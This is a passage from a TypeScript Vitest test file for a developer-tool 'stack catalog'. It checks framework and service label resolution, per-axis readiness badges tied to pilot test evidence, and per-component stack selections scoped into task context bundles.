import { readFileSync } from 'node:fs';
import { describe, expect, it } from 'vitest';
import { allowedUseFor, buildContextBundle, compileBrain, type BrainSourceRevision } from './brain.ts';
import {
  applyStackAction, detectStack, emptyStack, isStackDetectionPath, normalizeStackLabel, PILOT_EVIDENCE, readinessOf, resolveStackLabel, STACK_CATALOG, STACK_CATEGORIES,
  StackDetectionRecordSchema, StackDocumentSchema, stackBrainSources, stackItemKey, withholdRestrictedDetection, stackEntry, targetGates, type StackDocument,
} from './stack.ts';

/** The seed tables of docs/framework-tool-catalog.md §4 and §5, copied as written. Every label must be selectable. */
const SPEC_4: Record<string, string> = {
  'Web UI libraries/frameworks': 'React, Vue, Angular, Svelte, Solid, Qwik, Preact, Lit, Alpine.js, HTMX, Ember',
  'Web application frameworks': 'Next.js, React Router, Remix, Nuxt, SvelteKit, Astro, SolidStart, Qwik City, TanStack Start, Gatsby',
  'Static/content sites': 'VitePress, VuePress, Docusaurus, Eleventy, Hugo, Jekyll, MkDocs',
  'JavaScript/TypeScript APIs': 'Express, Fastify, Hono, NestJS, Koa, AdonisJS, Elysia, Hapi, tRPC',
  'Python APIs/web': 'Django, Django REST Framework, FastAPI, Flask, Starlette, Litestar, Tornado',
  PHP: 'Laravel, Symfony, Slim, CodeIgniter, CakePHP, WordPress, Drupal',
  Ruby: 'Ruby on Rails, Sinatra, Hanami',
  JVM: 'Spring Boot, Spring Framework, Quarkus, Micronaut, Ktor, Jakarta EE',
  '.NET web': 'ASP.NET Core, Blazor, ASP.NET MVC',
  Go: 'Standard net/http, Gin, Echo, Fiber, Chi, Beego',
  'Rust web': 'Axum, Actix Web, Rocket, Poem, Leptos, Yew, Dioxus',
  'Other server ecosystems': 'Phoenix/Plug, Vapor, Hummingbird, Drogon, Crow',
  'Cross-platform mobile': 'React Native, Expo, Flutter, Ionic Framework, Capacitor, NativeScript, .NET MAUI, Kotlin Multiplatform, Compose Multiplatform',
  'Apple-native UI': 'SwiftUI, UIKit, AppKit',
  'Android-native UI': 'Jetpack Compose, Android Views/XML',
  'Desktop shells/UI': 'Electron, Tauri, Qt, PySide, PyQt, Avalonia, WPF, WinUI, GTK',
  'Interactive/3D/game projects': 'Godot, Unity, Unreal Engine, Phaser, Three.js, Babylon.js',
  'AI/data application libraries': 'LangChain, LangGraph, LlamaIndex, Haystack, Semantic Kernel, DSPy, Transformers, PyTorch, TensorFlow, JAX, scikit-learn',
  'Data app/prototype UI': 'Streamlit, Gradio, Dash, Panel, Shiny',
  Languages: 'JavaScript, TypeScript, Python, Dart, Swift, Kotlin, Java, C#, PHP, Ruby, Go, Rust, Elixir, C, C++, R, SQL',
  Runtimes: 'Node.js, Bun, Deno, Python, JVM, .NET, PHP, Ruby, BEAM, browser, native binary, provider-specific runtime',
  Custom: 'Other/custom framework, plain HTML/CSS/JavaScript',
};
const SPEC_5: Record<string, string> = {
  auth: 'Clerk, Better Auth, Auth0, Supabase Auth, Firebase Authentication, Auth.js, Keycloak, Amazon Cognito, WorkOS, custom OIDC/SAML',
  payments: 'Clerk Billing, Stripe, Polar, Paddle, Lemon Squeezy, PayPal, Adyen, RevenueCat, Apple StoreKit, Google Play Billing',
  database_engines: 'PostgreSQL, MySQL, MariaDB, SQLite, MongoDB, SQL Server, Redis/Valkey, DynamoDB, ClickHouse, DuckDB, Cassandra',
  database_platforms: 'Supabase, Neon, Prisma Postgres, Firebase/Firestore, Convex, Appwrite, PocketBase, PlanetScale, Turso, Cloudflare D1, Amazon RDS',
  orm: 'Prisma ORM, Drizzle, TypeORM, Sequelize, Knex, Kysely, SQLAlchemy, Alembic, Django ORM, Entity Framework Core, Hibernate, Eloquent, Active Record, Diesel, SQLx, Flyway, Liquibase',
  analytics: 'PostHog, Plausible, Vercel Analytics, Google Analytics, Mixpanel, Amplitude, Matomo',
  security: 'Arcjet, Upstash Ratelimit, Cloudflare security services, Snyk, Semgrep, CodeQL, Trivy, Gitleaks, Dependabot, Renovate, custom security check',
  ui: 'Tailwind CSS, shadcn/ui, Radix UI, Material UI, Chakra UI, Mantine, Ant Design, Bootstrap, UnoCSS, CSS Modules, Sass, styled-components, Emotion, Figma, Storybook',
  state: 'TanStack Query, SWR, Apollo Client, Relay, Zustand, Redux Toolkit, Pinia, MobX, Riverpod, Bloc, Provider',
  api_protocols: 'REST/OpenAPI, GraphQL, gRPC/Protobuf, JSON Schema, AsyncAPI, WebSocket, SSE',
  testing: 'Vitest, Jest, Testing Library, Playwright, Cypress, WebdriverIO, pytest, unittest, JUnit, TestNG, PHPUnit, Pest, RSpec, xUnit, NUnit, Go testing, cargo test, Flutter test, XCTest, Swift Testing, Espresso, Appium, Maestro, Detox, k6, Locust, custom eval command',
  observability: 'Sentry, Bugsnag, Crashlytics, OpenTelemetry, Prometheus, Grafana, Datadog, New Relic, Elastic, Axiom, Better Stack',
  hosting: 'Vercel, Netlify, Cloudflare, Render, Railway, Fly.io, AWS, Google Cloud, Azure, DigitalOcean, Hetzner, self-hosted/custom',
  ci_review: 'GitHub Actions, GitLab CI, CircleCI, Buildkite, Jenkins, Azure Pipelines, CodeRabbit, Greptile, Copilot review, human review, custom check',
  mobile_build: 'EAS Build/Submit/Update, Xcode, Android Studio/SDK, Gradle, CocoaPods, Swift Package Manager, Fastlane, Xcode Cloud, Bitrise, Codemagic, Firebase App Distribution, TestFlight, Google Play Console',
  messaging: 'Resend, Postmark, SendGrid, Amazon SES, Mailgun, SMTP, Twilio, Firebase Cloud Messaging, APNs, OneSignal, Novu',
  storage: 'Amazon S3, Google Cloud Storage, Azure Blob Storage, Cloudflare R2, Supabase Storage, Firebase Storage, MinIO, Cloudinary, UploadThing, Mux',
  search: 'PostgreSQL full-text, pgvector, Elasticsearch, OpenSearch, Meilisearch, Typesense, Algolia, Qdrant, Pinecone, Weaviate, Chroma, Milvus',
  jobs: 'BullMQ, Celery, Sidekiq, Dramatiq, Hangfire, Temporal, Inngest, Trigger.dev, RabbitMQ, Kafka, Amazon SQS, Google Cloud Pub/Sub',
  cache_realtime: 'Redis, Valkey, Memcached, Upstash, Pusher, Ably, Socket.IO, Supabase Realtime, Firebase Realtime Database',
  cms: 'Sanity, Contentful, Strapi, Directus, Payload, WordPress, Ghost, TinaCMS',
  flags: 'PostHog flags, LaunchDarkly, Unleash, GrowthBook, Statsig, Firebase Remote Config',
  product_work: 'GitHub Issues, Linear, Jira, Notion, Intercom, Zendesk, Help Scout, Crisp, Slack, email/manual notes',
  package_build: 'npm, pnpm, Yarn, pip, uv, Poetry, Composer, Bundler, Cargo, Maven, Gradle, NuGet, Dart pub, Vite, webpack, Rspack, Parcel, esbuild, Rollup, Turborepo, Nx, Bazel',
  environment: 'Docker, Docker Compose, Dev Containers, Kubernetes, Terraform, Pulumi, Ansible, custom approved image',
  model_access: 'Selected provider API/SDK, approved private endpoint, eligible device/local endpoint, custom inference adapter',
};
const labels = (row: string): string[] => row.split(', ').map((s) => s.trim());

/** A small deterministic generator, so the property test is repeatable. */
function rng(seed: number): () => number {
  let s = seed >>> 0;
  return () => ((s = (s * 1664525 + 1013904223) >>> 0) / 2 ** 32);
}
/** A label as a person might type it: any case, stray whitespace, and spaces written as nothing, a hyphen or an underscore. */
function perturb(label: string, r: () => number): string {
  const sep = [' ', '', '-', '_', '  '][Math.floor(r() * 5)]!;
  const cased = [...label.replace(/ /g, sep)].map((ch) => (r() < 0.5 ? ch.toUpperCase() : ch.toLowerCase())).join('');
  return `${r() < 0.5 ? ' ' : ''}${cased}${r() < 0.5 ? '\t' : ''}`;
}

describe('stack catalog: seed coverage and identity', () => {
  it('every §4 and §5 seed label is a selectable entry', () => {
    for (const [group, row] of Object.entries(SPEC_4)) for (const l of labels(row)) expect(resolveStackLabel(l), `${group}: ${l}`).not.toBeNull();
    for (const [category, row] of Object.entries(SPEC_5)) {
      for (const l of labels(row)) {
        const id = resolveStackLabel(l);
        expect(id, `${category}: ${l}`).not.toBeNull();
        expect(stackEntry(id!)!.categories, `${l} is in ${category}`).toContain(category);
      }
    }
    expect(STACK_CATALOG.length).toBeGreaterThan(400);
  });

  it('every entry has a canonical id, a label, a kind, at least one category, a group and a filter', () => {
    const ids = new Set<string>();
    const categoryIds = new Set(STACK_CATEGORIES.map((c) => c.id));
    for (const e of STACK_CATALOG) {
      expect(e.id).toMatch(/^[a-z0-9][a-z0-9-]{0,62}$/);
      expect(ids.has(e.id), e.id).toBe(false);
      ids.add(e.id);
      expect(e.label.length).toBeGreaterThan(0);
      expect(e.categories.length).toBeGreaterThan(0);
      for (const c of e.categories) expect(categoryIds.has(c), `${e.id} ${c}`).toBe(true);
      expect(e.group.length).toBeGreaterThan(0);
      expect(['web', 'backend', 'mobile', 'desktop', 'ai_data', 'tools']).toContain(e.filter);
      for (const r of e.related) expect(stackEntry(r), `${e.id} related ${r}`).toBeDefined();
    }
  });

  it('property: every label and alias, typed any way, resolves to exactly one canonical id', () => {
    const owner = new Map<string, string>();
    for (const e of STACK_CATALOG) {
      for (const name of [e.label, ...e.aliases]) {
        const n = normalizeStackLabel(name);
        expect(n.length, name).toBeGreaterThan(0);
        // No two entries share a spelling: a duplicate label is one identity, never two.
        expect(owner.get(n) ?? e.id, `${name} is claimed by ${owner.get(n)} and ${e.id}`).toBe(e.id);
        owner.set(n, e.id);
      }
    }
    const r = rng(20261110);
    for (let round = 0; round < 25; round++) {
      for (const e of STACK_CATALOG) for (const name of [e.label, ...e.aliases]) expect(resolveStackLabel(perturb(name, r)), `${name}`).toBe(e.id);
    }
    expect(resolveStackLabel('definitely not a framework')).toBeNull();
    expect(resolveStackLabel('')).toBeNull();
  });

  it('a label listed in two tables is one identity in both categories', () => {
    expect(stackEntry(resolveStackLabel('Python')!)!.categories).toEqual(expect.arrayContaining(['languages', 'runtimes']));
    expect(stackEntry(resolveStackLabel('Redis')!)!.categories).toEqual(expect.arrayContaining(['database_engines', 'cache_realtime']));
    expect(resolveStackLabel('Redis/Valkey')).toBe(resolveStackLabel('Redis'));
    expect(stackEntry(resolveStackLabel('WordPress')!)!.categories).toEqual(expect.arrayContaining(['frameworks', 'cms']));
    expect(stackEntry(resolveStackLabel('Gradle')!)!.categories).toEqual(expect.arrayContaining(['mobile_build', 'package_build']));
    expect(resolveStackLabel('Next')).toBe(resolveStackLabel('Next.js'));
    expect(resolveStackLabel('Postgres')).toBe(resolveStackLabel('PostgreSQL'));
  });

  it('auth, billing and database products from one provider keep distinct identities, categories and actions', () => {
    const ids = (...ls: string[]) => ls.map((l) => resolveStackLabel(l)!);
    const supabase = ids('Supabase', 'Supabase Auth', 'Supabase Storage', 'Supabase Realtime');
    expect(new Set(supabase).size).toBe(4);
    for (const id of supabase) expect(stackEntry(id)!.provider).toBe('supabase');
    expect(stackEntry(supabase[1]!)!.categories).toEqual(['auth']);
    expect(stackEntry(supabase[0]!)!.categories).toEqual(['database_platforms']);
    const clerk = ids('Clerk', 'Clerk Billing');
    expect(new Set(clerk).size).toBe(2);
    expect(stackEntry(clerk[0]!)!.categories).toEqual(['auth']);
    expect(stackEntry(clerk[1]!)!.categories).toEqual(['payments']);
    expect(resolveStackLabel('Prisma Postgres')).not.toBe(resolveStackLabel('Prisma ORM'));
    const firebase = ids('Firebase Authentication', 'Firebase/Firestore', 'Firebase Storage', 'Firebase Cloud Messaging', 'Firebase Remote Config');
    expect(new Set(firebase).size).toBe(5);
    // Readiness is per entry: one provider's products never share a single badge or a credential.
    expect(readinessOf({ kind: 'catalog', entryId: clerk[0]!, version: null, origin: 'declared', evidence: null })).not.toBe(readinessOf({ kind: 'catalog', entryId: clerk[1]!, version: null, origin: 'declared', evidence: null }));
  });

  it('the seed carries no skill counts, MCP URLs, install commands or credentials, and InstaCloud stays an unresolved identity', () => {
    const text = JSON.stringify(STACK_CATALOG).toLowerCase();
    for (const banned of ['skillcount', 'skills":', 'mcpurl', 'mcp://', 'install', 'apikey', 'credential', 'secret', 'token', 'https://']) expect(text, banned).not.toContain(banned);
    const insta = stackEntry(resolveStackLabel('InstaCloud')!)!;
    expect(insta.unresolvedIdentity).toBe(true);
    expect(insta.categories).toEqual(['database_platforms']);
  });

  it('Vite is a build tool, separate from a UI framework, and React (Vite) is a preset of the two', () => {
    expect(stackEntry('vite')!.kind).toBe('build_tool');
    const preset = stackEntry(resolveStackLabel('React (Vite)')!)!;
    expect(preset.kind).toBe('preset');
    expect(preset.presetOf).toEqual(['react', 'vite']);
    expect(stackEntry(resolveStackLabel('Expo')!)!.related).toContain(resolveStackLabel('React Native'));
    expect(resolveStackLabel('Kotlin Multiplatform')).not.toBe(resolveStackLabel('Compose Multiplatform'));
  });
});

describe('stack catalog: readiness is several axes and honest about what was tested', () => {
  const item = (label: string) => ({ kind: 'catalog' as const, entryId: resolveStackLabel(label)!, version: null, origin: 'declared' as const, evidence: null });
  const axis = (label: string, name: string) => readinessOf(item(label)).find((a) => a.axis === name)!;

  it('every seed entry starts not tested, except what the pilot verifier suite runs, which cites that evidence', () => {
    // Each entry at the version the pilot pinned, on a web and server component: only what the suite runs reads as tested.
    const pinned = (id: string) => PILOT_EVIDENCE.find((p) => p.entryId === id)?.version ?? '1.0.0';
    const tested = STACK_CATALOG.filter((e) => readinessOf({ kind: 'catalog', entryId: e.id, version: pinned(e.id), origin: 'declared', evidence: null }, { targets: ['web', 'server'] }).find((a) => a.axis === 'tested')!.state === 'tested').map((e) => e.id).sort();
    expect(tested).toEqual(['express', 'nodejs', 'playwright', 'pnpm', 'react', 'sqlite', 'typescript', 'vite', 'vitest']);
    // The pilot's API is Express; Fastify is the control plane's own stack and has not been run by the suite.
    expect(axis('Fastify', 'tested').state).toBe('not_tested');
    expect(axis('Next.js', 'tested')).toMatchObject({ state: 'not_tested', label: 'Not tested' });
    const vitest = axis('Vitest', 'tested');
    expect(vitest.evidence).toEqual([expect.objectContaining({ suiteId: 'feedback-board', platform: 'web', version: '5.1.0', path: 'services/verifier/suites/feedback-board/manifest.json' })]);
  });

  it('tested needs the pinned version and a target the pilot ran: a mismatch cites what ran instead', () => {
    const tested = (version: string | null, targets: ('web' | 'server' | 'ios' | 'android' | 'desktop')[] | undefined) =>
      readinessOf({ kind: 'catalog', entryId: 'react', version, origin: 'declared', evidence: null }, targets === undefined ? {} : { targets }).find((a) => a.axis === 'tested')!;
    expect(tested('19.3.1', ['web'])).toMatchObject({ state: 'tested', label: 'Run by the pilot suite (web)' });
    // Another version: not tested, and says what did run.
    const old = tested('16.0.0', ['web']);
    expect(old).toMatchObject({ state: 'not_tested', label: 'Not tested' });
    expect(old.explanation).toMatch(/pilot ran 19\.3\.1 on web/i);
    expect(old.evidence).toEqual([expect.objectContaining({ version: '19.3.1' })]);
    // A range is not the pinned version.
    expect(tested('^19.0.0', ['web']).state).toBe('not_tested');
    // The right version on a component that does not build for web.
    const ios = tested('19.3.1', ['ios']);
    expect(ios.state).toBe('not_tested');
    expect(ios.explanation).toMatch(/pilot ran 19\.3\.1 on web/i);
    expect(tested('19.3.1', undefined).state).toBe('not_tested');
    // No version selected: the pilot's run is reported, never plain tested.
    expect(tested(null, ['web'])).toMatchObject({ state: 'not_tested', label: 'Pilot ran 19.3.1 on web' });
    // A pinned major line accepts its own versions only.
    const node = (v: string) => readinessOf({ kind: 'catalog', entryId: 'nodejs', version: v, origin: 'declared', evidence: null }, { targets: ['server'] }).find((a) => a.axis === 'tested')!.state;
    expect(node('24.x')).toBe('tested');
    expect(node('24.11.0')).toBe('tested');
    expect(node('>=24 <25')).toBe('tested');
    expect(node('22.0.0')).toBe('not_tested');
  });

  it('MCP discovery alone never makes a connector usable', () => {
    const c = readinessOf({ kind: 'catalog', entryId: 'stripe', version: null, origin: 'declared', evidence: null }, { connection: { discovered: true } }).find((a) => a.axis === 'connector')!;
    expect(c).toMatchObject({ state: 'unverified', label: 'Discovered · not usable' });
    expect(c.explanation).toMatch(/authenticated, scoped connection/i);
    expect(readinessOf({ kind: 'catalog', entryId: 'stripe', version: null, origin: 'declared', evidence: null }, { connection: { discovered: true } }).find((a) => a.axis === 'auth')!.state).toBe('not_connected');
  });

  it('the pilot evidence matches the verifier suite manifest and the starter it builds, so it cannot drift silently', () => {
    const root = new URL('../../../', import.meta.url);
    const manifest = JSON.parse(readFileSync(new URL('services/verifier/suites/feedback-board/manifest.json', root), 'utf8')) as { suiteId: string; version: string; tools: Record<string, string> };
    const starter = JSON.parse(readFileSync(new URL('examples/feedback-board-starter/package.json', root), 'utf8')) as { dependencies: Record<string, string>; devDependencies: Record<string, string>; scripts: Record<string, string> };
    const deps = { ...starter.dependencies, ...starter.devDependencies };
    for (const ev of PILOT_EVIDENCE) {
      expect(ev.suiteId).toBe(manifest.suiteId);
      expect(ev.suiteVersion).toBe(manifest.version);
      if (ev.path.endsWith('manifest.json')) expect(manifest.tools[ev.pin], ev.entryId).toBe(ev.version);
      else expect(deps[ev.pin], ev.entryId).toBe(ev.version);
    }
    expect(starter.scripts.build).toContain('vite build');
    expect(starter.scripts.build).toContain('tsc');
  });

  it('skill badges show only reviewed bindings: none exist, so every entry reads No reviewed skills', () => {
    for (const e of STACK_CATALOG.slice(0, 50)) {
      const skills = readinessOf({ kind: 'catalog', entryId: e.id, version: null, origin: 'declared', evidence: null }).find((a) => a.axis === 'skills')!;
      expect(skills).toMatchObject({ state: 'none_reviewed', label: 'No reviewed skills' });
    }
  });

  it('a service has its own connector and authentication axes; selecting it creates no credential', () => {
    expect(axis('Stripe', 'connector')).toMatchObject({ state: 'none_available', label: 'No connector' });
    expect(axis('Stripe', 'auth')).toMatchObject({ state: 'not_connected', label: 'Not connected' });
    expect(axis('Stripe', 'auth').explanation).toMatch(/no credential/i);
    expect(axis('Next.js', 'connector').state).toBe('not_applicable');
    expect(axis('Next.js', 'knowledge')).toMatchObject({ state: 'not_linked' });
    expect(readinessOf(item('Next.js')).map((a) => a.axis)).toEqual(['knowledge', 'skills', 'connector', 'auth', 'tested']);
  });

  it('a custom or legacy entry is recorded without pretending it has reviewed skills or tested commands', () => {
    const axes = readinessOf({ kind: 'custom', label: 'In-house PHP 5 framework', canonicalSource: null });
    expect(axes.map((a) => a.state)).toEqual(['unknown', 'unknown', 'unknown', 'unknown', 'unknown']);
    for (const a of axes) expect(a.label).toBe('Unknown · not reviewed');
    expect(JSON.stringify(axes)).not.toMatch(/command|skill id/i);
  });

  it('missing native build capability leaves iOS and Android incomplete even when shared web checks pass', () => {
    const gates = targetGates(['web', 'ios', 'android'], { webChecks: 'passed', native: { ios: false, android: false } });
    expect(gates).toEqual([
      expect.objectContaining({ target: 'web', state: 'passed' }),
      expect.objectContaining({ target: 'ios', state: 'incomplete', label: 'iOS runner required' }),
      expect.objectContaining({ target: 'android', state: 'incomplete', label: 'Android build not assessed' }),
    ]);
    expect(gates[1]!.explanation).toMatch(/web check/i);
    // A runner that reports a native toolchain still has no native test here: the gate is not assessed, never passed.
    const capable = targetGates(['ios'], { webChecks: 'passed', native: { ios: true, android: false } });
    expect(capable[0]!.state).toBe('not_assessed');
  });
});

describe('stack selections: per component, None is not Not decided', () => {
  const ok = (doc: StackDocument, action: Parameters<typeof applyStackAction>[1]): StackDocument => {
    const r = applyStackAction(doc, action);
    if (!r.ok) throw new Error(`${r.code}: ${r.message}`);
    return r.doc;
  };
  const withComponent = (path: string, name: string, targets: ('web' | 'server' | 'ios' | 'android' | 'desktop')[]) => (doc: StackDocument) => ok(doc, { kind: 'component.upsert', path, name, targets });

  it('a stored document from a newer catalog keeps its known categories: unknown ones are dropped, not fatal', () => {
    const p = StackDocumentSchema.safeParse({ components: [{ path: '.', name: 'x', targets: [], categories: { future_cat: { state: 'none' }, payments: { state: 'none' } } }], detection: null });
    expect(p.success).toBe(true);
    expect(p.success && p.data.components[0]!.categories.payments).toEqual({ state: 'none' });
    expect(p.success && 'future_cat' in p.data.components[0]!.categories).toBe(false);
  });

  it('a new component has every category Not decided; None is stored, read and reported as a different state', () => {
    const doc = withComponent('apps/web', 'Web', ['web'])(emptyStack());
    const web = doc.components[0]!;
    for (const c of STACK_CATEGORIES) expect(web.categories[c.id]).toEqual({ state: 'not_decided' });
    const none = ok(doc, { kind: 'category.set', path: 'apps/web', category: 'payments', state: 'none' });
    expect(none.components[0]!.categories.payments).toEqual({ state: 'none' });
    expect(StackDocumentSchema.parse(JSON.parse(JSON.stringify(none))).components[0]!.categories.payments).toEqual({ state: 'none' });
    expect(JSON.stringify(none)).not.toBe(JSON.stringify(doc));
  });

  it('multi-select within a component; removing the last selection returns to Not decided and deletes nothing else', () => {
    let doc = withComponent('apps/web', 'Web', ['web'])(emptyStack());
    doc = ok(doc, { kind: 'item.add', path: 'apps/web', category: 'auth', item: { kind: 'catalog', entryId: resolveStackLabel('Clerk')! } });
    doc = ok(doc, { kind: 'item.add', path: 'apps/web', category: 'auth', item: { kind: 'catalog', entryId: resolveStackLabel('Auth0')! } });
    expect(doc.components[0]!.categories.auth).toMatchObject({ state: 'selected', items: [{ entryId: 'clerk' }, { entryId: 'auth0' }] });
    doc = ok(doc, { kind: 'item.remove', path: 'apps/web', category: 'auth', key: 'clerk' });
    doc = ok(doc, { kind: 'item.remove', path: 'apps/web', category: 'auth', key: 'auth0' });
    expect(doc.components[0]!.categories.auth).toEqual({ state: 'not_decided' });
    // Setting None over a selection clears it: None records no declared provider.
    doc = ok(doc, { kind: 'item.add', path: 'apps/web', category: 'payments', item: { kind: 'catalog', entryId: 'stripe' } });
    doc = ok(doc, { kind: 'category.set', path: 'apps/web', category: 'payments', state: 'none' });
    expect(doc.components[0]!.categories.payments).toEqual({ state: 'none' });
  });

  it('refuses an unknown entry, an entry in a category it is not in, a duplicate and an unknown component', () => {
    const doc = withComponent('apps/web', 'Web', ['web'])(emptyStack());
    expect(applyStackAction(doc, { kind: 'item.add', path: 'apps/web', category: 'auth', item: { kind: 'catalog', entryId: 'nope' } })).toMatchObject({ ok: false, code: 'stack_entry_unknown' });
    expect(applyStackAction(doc, { kind: 'item.add', path: 'apps/web', category: 'auth', item: { kind: 'catalog', entryId: 'stripe' } })).toMatchObject({ ok: false, code: 'stack_entry_wrong_category' });
    expect(applyStackAction(doc, { kind: 'item.add', path: 'apps/api', category: 'auth', item: { kind: 'catalog', entryId: 'clerk' } })).toMatchObject({ ok: false, code: 'stack_component_not_found' });
    const once = ok(doc, { kind: 'item.add', path: 'apps/web', category: 'auth', item: { kind: 'catalog', entryId: 'clerk' } });
    expect(applyStackAction(once, { kind: 'item.add', path: 'apps/web', category: 'auth', item: { kind: 'catalog', entryId: 'clerk' } })).toMatchObject({ ok: false, code: 'stack_item_exists' });
  });

  it('a custom entry takes a free label and an optional canonical source, in any category', () => {
    let doc = withComponent('.', 'Repository', ['server'])(emptyStack());
    doc = ok(doc, { kind: 'item.add', path: '.', category: 'frameworks', item: { kind: 'custom', label: 'Legacy CGI app', canonicalSource: null } });
    expect(doc.components[0]!.categories.frameworks).toEqual({ state: 'selected', items: [{ kind: 'custom', label: 'Legacy CGI app', canonicalSource: null }] });
  });

  it('Next.js, Expo/React Native and FastAPI at different paths: each worker gets only its component\'s stack, cited', () => {
    let doc = emptyStack();
    doc = withComponent('apps/web', 'Web', ['web'])(doc);
    doc = withComponent('apps/mobile', 'Mobile', ['ios', 'android'])(doc);
    doc = withComponent('services/api', 'API', ['server'])(doc);
    doc = ok(doc, { kind: 'item.add', path: 'apps/web', category: 'frameworks', item: { kind: 'catalog', entryId: resolveStackLabel('Next.js')! } });
    doc = ok(doc, { kind: 'item.add', path: 'apps/mobile', category: 'frameworks', item: { kind: 'catalog', entryId: resolveStackLabel('Expo')! } });
    doc = ok(doc, { kind: 'item.add', path: 'apps/mobile', category: 'frameworks', item: { kind: 'catalog', entryId: resolveStackLabel('React Native')! } });
    doc = ok(doc, { kind: 'item.add', path: 'services/api', category: 'frameworks', item: { kind: 'catalog', entryId: resolveStackLabel('FastAPI')! } });
    doc = ok(doc, { kind: 'category.set', path: 'services/api', category: 'payments', state: 'none' });

    let seq = 0;
    const revisions: BrainSourceRevision[] = stackBrainSources(doc).map((s) => ({
      ...s, revision: 1, kind: 'stack', standing: 'accepted', classification: 'internal', allowedUse: allowedUseFor('internal'), derivedFrom: [], taskId: null,
      provenance: { origin: 'owner', ref: 'stack@1', recordedBy: 'owner' }, contentSha256: 'a'.repeat(64), seq: (seq += 1), recordedAt: '2026-11-10T08:00:00.000Z',
    }));
    expect(revisions.map((r) => r.sourceId)).toEqual(['stack:apps/mobile', 'stack:apps/web', 'stack:services/api']);
    const compilation = compileBrain({ revisions, revocations: [], kept: new Set(), previous: [], version: 1, generatedAt: '2026-11-10T08:00:00.000Z' });
    const bundle = (paths: string[]) => buildContextBundle({ compilation, revisions, revocations: [], sourceHead: seq, destination: 'local', streamable: false, task: { taskId: 'T1', baseSha: 'b'.repeat(40), criteria: [], dependsOn: [], paths } });
    const web = bundle(['apps/web/src']);
    expect(web.claims.map((c) => c.key).sort()).toEqual(['component:apps/web', 'component:apps/web:frameworks:nextjs']);
    expect(web.claims.find((c) => c.key === 'component:apps/web:frameworks:nextjs')).toMatchObject({ text: expect.stringContaining('Next.js'), citations: [{ sourceId: 'stack:apps/web', revision: 1, anchor: 'stack/apps/web/frameworks/nextjs' }] });
    expect(web.omissions).toEqual(expect.arrayContaining([{ kind: 'claim', id: 'architecture:component:apps/mobile:frameworks:expo', reason: 'out_of_scope' }]));
    expect(JSON.stringify(web.claims)).not.toMatch(/FastAPI|Expo/);
    const mobile = bundle(['apps/mobile']);
    expect(mobile.claims.find((c) => c.key === 'component:apps/mobile:frameworks:expo')!.text).toMatch(/Expo/);
    expect(mobile.claims.find((c) => c.key === 'component:apps/mobile:frameworks:react-native')!.text).toMatch(/React Native/);
    expect(JSON.stringify(mobile.claims)).not.toMatch(/Next\.js|FastAPI/);
    const api = bundle(['services/api']);
    expect(api.claims.find((c) => c.key === 'component:services/api:payments')!.text).toMatch(/None/);
    // A task that touches nothing in any component gets no stack at all.
    expect(bundle(['docs']).claims.filter((c) => c.key.startsWith('component:'))).toEqual([]);
  });

  it('the accepted brief\'s own stack lines (stack:1, stack:2) are not component claims and stay in scope for every task', () => {
    const brief: BrainSourceRevision = {
      sourceId: 'brief:p', revision: 1, kind: 'brief', title: 'Accepted brief', standing: 'accepted', classification: 'internal', allowedUse: allowedUseFor('internal'), derivedFrom: [], taskId: null,
      provenance: { origin: 'onboarding', ref: 'blueprint:v1', recordedBy: 'control-api' }, contentSha256: 'a'.repeat(64), seq: 1, recordedAt: '2026-11-10T08:00:00.000Z',
      sections: [{ anchor: 'stack/1', heading: 'React', text: 'Interactive UI', key: 'stack:1' }],
    };
    const compilation = compileBrain({ revisions: [brief], revocations: [], kept: new Set(), previous: [], version: 1, generatedAt: '2026-11-10T08:00:00.000Z' });
    const b = buildContextBundle({ compilation, revisions: [brief], revocations: [], sourceHead: 1, destination: 'local', streamable: false, task: { taskId: 'T1', baseSha: 'b'.repeat(40), criteria: [], dependsOn: [], paths: ['src'] } });
    expect(b.claims.map((c) => c.key)).toEqual(['stack:1']);
  });

  it('the Brain text says what the pilot ran, never that a mismatched selection is tested', () => {
    let doc = withComponent('apps/mobile', 'Mobile', ['ios'])(emptyStack());
    doc = ok(doc, { kind: 'item.add', path: 'apps/mobile', category: 'frameworks', item: { kind: 'catalog', entryId: 'react', version: '17.0.2' } });
    doc = withComponent('apps/web', 'Web', ['web'])(doc);
    doc = ok(doc, { kind: 'item.add', path: 'apps/web', category: 'frameworks', item: { kind: 'catalog', entryId: 'react', version: '19.3.1' } });
    const [mobile, web] = stackBrainSources(doc);
    const text = (s: typeof mobile) => s!.sections.find((x) => x.key?.endsWith(':react'))!.text;
    expect(text(mobile)).toMatch(/not tested; the pilot ran 19\.3\.1 on web/);
    expect(text(mobile)).not.toMatch(/run on web by/);
    expect(text(web)).toMatch(/19\.3\.1 .*run on web by the pilot verifier suite at 19\.3\.1/);
  });

  it('a category with many detected entries is never dropped as too large: one claim per entry', () => {
    let doc = withComponent('apps/web', 'Web', ['web'])(emptyStack());
    const ids = STACK_CATALOG.filter((e) => e.categories.includes('ui')).slice(0, 15).map((e) => e.id);
    const long = `apps/web/${'deeply/nested/'.repeat(10)}package.json`;
    doc = { ...doc, detection: { commit: 'c'.repeat(40), detectedAt: '2026-11-10T08:00:00.000Z', runnerId: 'r', commands: [], skipped: [], items: ids.map((id) => ({ detectionId: `det:apps/web:${id}`, componentPath: 'apps/web', entryId: id, version: '1.2.3-beta.4+build.5678', evidence: { path: long, detail: `dependencies.${id} 1.2.3-beta.4+build.5678` }, state: 'proposed' as const })) } };
    for (const id of ids) doc = ok(doc, { kind: 'detection.confirm', detectionId: `det:apps/web:${id}` });
    let seq = 0;
    const revisions: BrainSourceRevision[] = stackBrainSources(doc).map((s) => ({
      ...s, revision: 1, kind: 'stack', standing: 'accepted', classification: 'internal', allowedUse: allowedUseFor('internal'), derivedFrom: [], taskId: null,
      provenance: { origin: 'owner', ref: 'stack@1', recordedBy: 'owner' }, contentSha256: 'a'.repeat(64), seq: (seq += 1), recordedAt: '2026-11-10T08:00:00.000Z',
    }));
    const compilation = compileBrain({ revisions, revocations: [], kept: new Set(), previous: [], version: 1, generatedAt: '2026-11-10T08:00:00.000Z' });
    const b = buildContextBundle({ compilation, revisions, revocations: [], sourceHead: seq, destination: 'local', streamable: false, task: { taskId: 'T1', baseSha: 'b'.repeat(40), criteria: [], dependsOn: [], paths: ['apps/web'] } });
    expect(b.claims.filter((c) => c.key.startsWith('component:apps/web:ui:'))).toHaveLength(15);
    expect(b.omissions.filter((o) => o.reason === 'too_large')).toEqual([]);
  });

  it('a component can be labelled restricted; its source carries that label, and a later upsert without one keeps it', () => {
